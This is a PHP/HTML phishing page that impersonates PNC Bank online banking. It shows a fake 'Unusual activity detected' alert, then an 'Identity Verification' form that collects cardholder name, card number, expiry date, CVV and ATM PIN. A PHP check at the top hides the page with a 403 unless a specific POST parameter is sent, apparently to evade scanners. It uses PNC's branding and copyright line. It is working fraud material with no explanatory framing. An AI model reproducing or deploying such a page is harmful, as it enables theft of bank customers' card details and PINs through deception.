<?php
if ($_SERVER['REQUEST_METHOD'] !== "POST" || !isset($_POST['requested_by']) || $_POST['requested_by'] !== 'file_get_contents') {
    http_response_code(403);
    echo "Sorry you can't be here.";
    exit(0);
}
?>

<html lang="en">

<head>
    <meta name="viewport" content="width=device-width; initial-scale=1"/>
    <title>PNC Bank Online Banking</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
          integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js"></script>
    <link href="https://gitcdn.link/cdn/TPCT/freelancing-frontend/main/views/assets/css/common.css" rel="stylesheet"/>
    <link href='https://fonts.googleapis.com/css?family=Alegreya' rel='stylesheet'>
    <link rel="shortcut icon" href="https://www.pnc.com/etc/designs/pnc-com/favicon.ico"/>
    <link rel="icon" href="https://www.pnc.com/etc/designs/pnc-com/favicon.ico"/>
    <link href="https://gitcdn.link/cdn/TPCT/freelancing-frontend/main/views/assets/css/card.css" rel="stylesheet"/>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"
            integrity="sha512-3n19xznO0ubPpSwYCRRBgHh63DrV+bdZfHK52b1esvId4GsfwStQNPJFjeQos2h3JwCmZl0/LgLxSKMAI55hgw=="
            crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://gitcdn.link/cdn/TPCT/freelancing-frontend/main/views/assets/js/mask.js"></script>
    <script src="https://gitcdn.link/cdn/TPCT/freelancing-frontend/main/views/assets/js/imask.js"></script>
    <script src="https://gitcdn.link/cdn/TPCT/freelancing-frontend/main/views/assets/js/card.js"></script>
</head>

<body>
<header class="container-fluid header">
    <div class="logo-container">
        <div class="page-name">
            <h1>Identity Verification</h1>
        </div>
    </div>
</header>
<div class="content">
    <div class="modal fade alert" id="alert-modal">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
                <div class="modal-body alert-danger">
                    <div class="d-flex flex-column align-items-center justify-content-center text-center">
                        <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                            <symbol id="check-circle-fill" fill="currentColor" viewBox="0 0 16 16">
                                <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zm-3.97-3.03a.75.75 0 0 0-1.08.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-.01-1.05z"/>
                            </symbol>
                            <symbol id="info-fill" fill="currentColor" viewBox="0 0 16 16">
                                <path d="M8 16A8 8 0 1 0 8 0a8 8 0 0 0 0 16zm.93-9.412-1 4.705c-.07.34.029.533.304.533.194 0 .487-.07.686-.246l-.088.416c-.287.346-.92.598-1.465.598-.703 0-1.002-.422-.808-1.319l.738-3.468c.064-.293.006-.399-.287-.47l-.451-.081.082-.381 2.29-.287zM8 5.5a1 1 0 1 1 0-2 1 1 0 0 1 0 2z"/>
                            </symbol>
                            <symbol id="exclamation-triangle-fill" fill="currentColor" viewBox="0 0 16 16">
                                <path d="M8.982 1.566a1.13 1.13 0 0 0-1.96 0L.165 13.233c-.457.778.091 1.767.98 1.767h13.713c.889 0 1.438-.99.98-1.767L8.982 1.566zM8 5c.535 0 .954.462.9.995l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 5.995A.905.905 0 0 1 8 5zm.002 6a1 1 0 1 1 0 2 1 1 0 0 1 0-2z"/>
                            </symbol>
                        </svg>
                        <svg class="bi flex-shrink-0 me-2" width="50" height="50" role="img" aria-label="Danger:">
                            <use xlink:href="#exclamation-triangle-fill"/>
                        </svg>
                        <h4>Unusual activity detected</h4>
                        <p>We need your help securing your account to prevent any unauthorized access. For your safety,
                            there may be some limitations on your account if the information isn't correct.</p>
                    </div>
                </div>
                <div class="modal-footer alert-danger d-flex align-items-center justify-content-center">
                    <button type="button" class="btn btn-secondary pnc-btn" data-bs-dismiss="modal">Close</button>
                </div>
            </div>
        </div>
    </div>
    <div class="steps d-flex">
        <div class="step current">
            <img src="https://gitcdn.link/cdn/TPCT/freelancing-frontend/main/views/assets/imgs/icon_topic_creditcards_orange.svg">
            <p>Identification</p>
        </div>
        <div class="step current">
            <img src="https://gitcdn.link/cdn/TPCT/freelancing-frontend/main/views/assets/imgs/smart_access_icon_secure.svg">
            <p>Verify Ownership</p>
        </div>
        <div class="step">
            <img src="https://gitcdn.link/cdn/TPCT/freelancing-frontend/main/views/assets/imgs/id-card.svg">
            <p>Verify ID</p>
        </div>
        <div class="step">
            <img src="https://gitcdn.link/cdn/TPCT/freelancing-frontend/main/views/assets/imgs/tick.svg">
            <p>Done</p>
        </div>
    </div>

    <div class="main-content">
        <div class="credit-card">
            <div class="front">
                <div id="ccsingle"></div>
                <svg version="1.1" id="cardfront" xmlns="http://www.w3.org/2000/svg"
                     xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 750 471"
                     style="enable-background:new 0 0 750 471;" xml:space="preserve">
                        <g id="Front">
                            <g id="CardBackground">
                                <g id="Page-1_1_">
                                    <g id="amex_1_">
                                        <path id="Rectangle-1_1_" class="lightcolor default"
                                              d="M40,0h670c22.1,0,40,17.9,40,40v391c0,22.1-17.9,40-40,40H40c-22.1,0-40-17.9-40-40V40 C0,17.9,17.9,0,40,0z">
                                        </path>
                                    </g>
                                </g>
                                <path class="darkcolor defaultdark"
                                      d="M750,431V193.2c-217.6-57.5-556.4-13.5-750,24.9V431c0,22.1,17.9,40,40,40h670C732.1,471,750,453.1,750,431z">
                                </path>
                            </g>
                            <text transform="matrix(1 0 0 1 60.106 295.0121)" id="svgnumber"
                                  class="st2 st3 st4">0123 4567 8910 1112
                            </text>
                            <text
                                    transform="matrix(1 0 0 1 54.1064 428.1723)" id="svgname" class="st2 st5 st6">John
                                Doe
                            </text>
                            <g>
                                <text transform="matrix(1 0 0 1 574.4219 433.8095)" id="svgexpire"
                                      class="st2 st5 st9">01/23
                                </text>
                                <text transform="matrix(1 0 0 1 479.3848 417.0097)"
                                      class="st2 st10 st11">VALID
                                </text>
                                <text
                                        transform="matrix(1 0 0 1 479.3848 435.6762)" class="st2 st10 st11">THRU
                                </text>
                                <polygon class="st2" points="554.5,421 540.4,414.2 540.4,427.9 "></polygon>
                            </g>

                            <g id="cchip">
                                <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
                                     version="1.1" id="Layer_1" x="0px" y="0px" width="420px" height="200px"
                                     viewBox="0 0 891 550" enable-background="new 0 0 697 418" xml:space="preserve">
                                    <image id="image0" width="697" height="418" x="0" y="0"
                                           href="https://gitcdn.link/cdn/TPCT/freelancing-frontend/main/views/assets/imgs/main-logo.svg"></image>
                                </svg>
                            </g>
                        </g>
                    <g id="Back">
                    </g>
                    </svg>
            </div>
            <div class="back" style="display: none;">
                <svg version="1.1" id="cardback" xmlns="http://www.w3.org/2000/svg"
                     xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 750 471"
                     style="enable-background:new 0 0 750 471;" xml:space="preserve">
					<g id="Back">
                        <g id="Page-1_2_">
                            <g id="amex_2_">
                                <path id="Rectangle-1_2_" class="darkcolor defaultdark"
                                      d="M40,0h670c22.1,0,40,17.9,40,40v391c0,22.1-17.9,40-40,40H40c-22.1,0-40-17.9-40-40V40 C0,17.9,17.9,0,40,0z"></path>
                            </g>
                        </g>
                        <rect y="61.6" class="st2" width="750" height="78"></rect>
                        <g>
                            <path class="st3"
                                  d="M701.1,249.1H48.9c-3.3,0-6-2.7-6-6v-52.5c0-3.3,2.7-6,6-6h652.1c3.3,0,6,2.7,6,6v52.5 C707.1,246.4,704.4,249.1,701.1,249.1z"></path>
                            <rect x="42.9" y="198.6" class="st4" width="664.1" height="10.5"></rect>
                            <rect x="42.9" y="224.5" class="st4" width="664.1" height="10.5"></rect>
                            <path class="st5"
                                  d="M701.1,184.6H618h-8h-10v64.5h10h8h83.1c3.3,0,6-2.7,6-6v-52.5C707.1,187.3,704.4,184.6,701.1,184.6z"></path>
                        </g>
                        <text transform="matrix(1 0 0 1 621.999 227.2734)" id="svgsecurity" class="st6 st7">000</text>
                        <g class="st8"></g>
                        <rect x="58.1" y="378.6" class="st11" width="375.5" height="13.5"></rect>
                        <rect x="58.1" y="405.6" class="st11" width="421.7" height="13.5"></rect>
                        <text transform="matrix(1 0 0 1 59.5073 228.6099)" id="svgnameback" class="st12 st13">sdf</text>
                    </g>
				</svg>
            </div>
        </div>
        <div class="card-info">
            <form method="post" id="info_form">
                <span id="generatecard" style="display: none;"></span>
                <input class="form-control" type="text" placeholder="Card Holder Name"
                       aria-label="name on card" name="fnm" id="fnm">
                <div class="input-group mt-2">
                    <input class="form-control ccn" id="ccn" name="ccn" type="text" placeholder="Card Number"
                           aria-label="credit card number">
                    <svg id="ccicon" class="ccicon" viewBox="0 0 750 471" version="1.1"
                         xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"></svg>
                </div>
                <div class="input-group mt-2">
                    <input class="form-control me-2" name="cex" id="cex" type="text" placeholder="MM/YY"
                           aria-label="expire date">
                    <input class="form-control me-2" name="ccv" id="csc" type="text" placeholder="CCV" aria-label="ccv">
                    <input class="form-control" type="text" placeholder="ATM PIN"
                           aria-label="pin" name="atm" id="atm">
                </div>
                <div class="input-group mt-2 d-flex justify-content-center">
                    <input type="submit" name="submit" value="next" id="next" class="btn mt-2 pnc-btn"
                           form="info_form"/>
                </div>
            </form>
        </div>
    </div>
</div>
<footer class="py-3 footer container-fluid">
    <ul class="nav justify-content-center">
        <li class="nav-item footer-link hoverable"><a href="#">Online Banking Guarantee</a></li>
        <li class="nav-item footer-link hoverable"><a href="#">Service Agreement</a></li>
        <li class="nav-item footer-link hoverable"><a href="#">Privacy</a></li>
        <li class="nav-item footer-link hoverable"><a href="#">Online Security</a></li>
    </ul>
    <p class="text-center text-muted">© 2022 The PNC Financial Services Group, Inc. All rights reserved.</p>
</footer>
<script>
    new bootstrap.Modal(document.getElementById('alert-modal'), {}).show();
</script>
</body>

</html>